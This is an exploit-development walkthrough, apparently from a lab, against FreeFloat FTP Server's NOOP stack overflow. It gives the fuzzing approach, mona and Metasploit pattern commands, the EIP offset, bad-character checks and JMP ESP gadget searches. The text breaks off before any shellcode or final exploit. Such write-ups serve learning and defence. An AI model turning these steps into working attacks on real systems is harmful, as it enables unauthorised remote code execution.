
🧪 Methodology for Exploiting CVE-2025-5548
📑 Table of Contents
Step 0: Understanding the target
Step 1: Fuzzing the command
Step 2: Discover Offset to EIP Register
Step 3: Control EIP
Step 4: Find Bad Characters
Step 5: JMP ESP
Step 6: Generate Shellcode
Step 7: Exploit Vulnerability (RCE / PrivEsc)
🪜 Step 0: Understanding the target
Before starting exploitation, we must understand how the server processes input and where the vulnerability is located. FreeFloat FTP Server is a legacy FTP service that listens on TCP port 21 and processes commands, which are parsed internally and handled by a command dispatcher function. Since this software was written without modern security practices, some handlers use unsafe functions such as strcpy, which may lead to stack buffer overflows.

In this CVE, the vulnerable command is NOOP, which can be used to trigger a classic stack buffer overflow.

💻 Notes
IDA -> New -> Open FTPServer.exe -> OK
View -> Open subviews -> Strings
View -> "USER "
Double click -> USER
Right click on string -> Xrefs graph to ... -> sub_xxxxxx -> Command handler
Follow function calls -> sub_xxxxxx -> Look for strcpy
🪜 Step 1: Fuzzing the command
After understanding the target, the next step is to check how the server reacts to long inputs. This is done by sending increasingly larger strings to the vulnerable command until the program crashes.

The goal of fuzzing is to determine if the server crashes when processing oversized input.

When the buffer becomes too large, the server will stop responding or crash, which indicates a possible buffer overflow.

💻 Notes
Create fuzzing script -> Python socket
Connect -> Port 21
Login -> USER / PASS
Send -> NOOP + payload
Increase payload size
🪜 Step 2: Discover Offset to EIP Register
Once a crash has been confirmed during fuzzing, the next step is to determine how many bytes are required to overwrite the EIP register.

The EIP register controls the execution flow of the program. If we can overwrite EIP, we can redirect execution to our own payload.

To find the exact offset, we send a cyclic pattern instead of a simple string of "A"s. After the crash, the value stored in EIP can be used to calculate the exact position where the overwrite occurs.

This allows us to know how many bytes are needed to reach EIP.

💻 Notes
Generate a cyclic pattern to found the exact offset of the crash:

(Windows)		!mona pattern_create 100
(Ubuntu)		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2...Cj7Cj8.........
python3 -c "length=100; import itertools; print(''.join([a+b+c for a,b,c in itertools.product('ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz','0123456789')])[:length])"
!mona pattern_create 400
Open CMD
cd "C:\Program Files (x86)\Immunity Inc\Immunity Debugger"
notepad.exe pattern.txt
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
!mona pattern_offset 41326941
!mona findmsp
[+] Examining registers
EIP contains normal pattern : 0x41326941 (offset 246)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
Copy selection to clipboard
41326941
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 400 -q 41326941
[*] Exact match at offset 246
🪜 Step 3: Control EIP
After finding the offset, the next step is to verify that we can overwrite the EIP register. The goal is to replace the return address with a known value and confirm that the program jumps to it when the crash occurs.

To do this, we send a payload that contains:

Padding until the offset
A known value to overwrite EIP
Optional extra bytes after EIP
If the offset is correct, the debugger will show that EIP contains the value we injected.

💻 Notes
"A" * 246 + "BBBB"
🪜 Step 4: Find Bad Characters
After controlling EIP, the next step is to determine which characters cannot be used in the payload. Some bytes may terminate the string, break the command parsing, or be modified before reaching memory. These are called bad characters and must be excluded from the final shellcode.

To find them, we send all possible byte values after the EIP overwrite and compare what arrives in memory.

💻 Notes
Common bad characters
Null Byte (\x00), New Line (\x0A), Carriage Return (\x0D), and Form Feed (\xFF)

(Python)		for i in range(0,256): print('\\x%02X' % i, end='')
(Bash)			for i in {0..255}; do printf "\\\x%02x" $i;done
mkdir C:\Mona
!mona config -set workingfolder C:\Mona
!mona bytearray
!mona compare -f C:\Mona\bytearray.bin -a 0336FBE4 (ESP MEMORY ADDRESS)
	ESP Follow in Dump
!mona bytearray -b "\x00"
!mona compare -f C:\Mona\bytearray.bin -a 0335FBE4 (ESP MEMORY ADDRESS)
!mona bytearray -b "\x00\x0a"
!mona compare -f C:\Mona\bytearray.bin -a 034DFBE4 (ESP MEMORY ADDRESS)
!mona bytearray -b "\x00\x0a\x0d"
!mona compare -f C:\Mona\bytearray.bin -a 0343FBE4 (ESP MEMORY ADDRESS)
🪜 Step 5: JMP ESP
Once we control EIP and know the valid characters, the next step is to redirect execution to our shellcode. The shellcode will be placed in the stack, so we need an instruction that jumps to the address stored in ESP. A common technique is to overwrite EIP with the address of a JMP ESP instruction located inside a module without protections such as ASLR or SafeSEH. When the program crashes, execution will jump to ESP, where our payload will be located.

On legacy systems such as Windows XP or Windows 7, this step is usually straightforward because system modules like kernel32.dll are loaded at fixed addresses, making it possible to reuse the same gadget across executions. However, on modern systems (Windows 10 / Windows 11), most modules are compiled with ASLR, which means their addresses change every time the program runs. In addition, the main binary may not contain any usable JMP ESP / CALL ESP instruction without bad characters. Because of this, a reliable exploit cannot be built in the same way as in older systems.

For educational purposes, we can still continue the exploitation by running the program inside a debugger and searching for a valid gadget in memory while the debugger is attached. Even if the module has ASLR enabled, the address will remain stable during the debugging session, allowing us to use it to demonstrate control of execution flow.

💻 Notes
!mona modules
!mona jmp -r esp -cpb "\x00\x0a\x0d"
!mona asm -s "jmp esp"
jmp esp
!mona find -s "\xff\xe4" -cpb "\x00\x0a\x0d"

call esp
!mona find -s "\xff\xd4" -cpb "\x00\x0a\x0d"

jmp [esp]
!mona find -s "\xff\x24\x24" -cpb "\x00\x0a\x0d"
!mona rop -cpb "\x00\x0a\x0d"
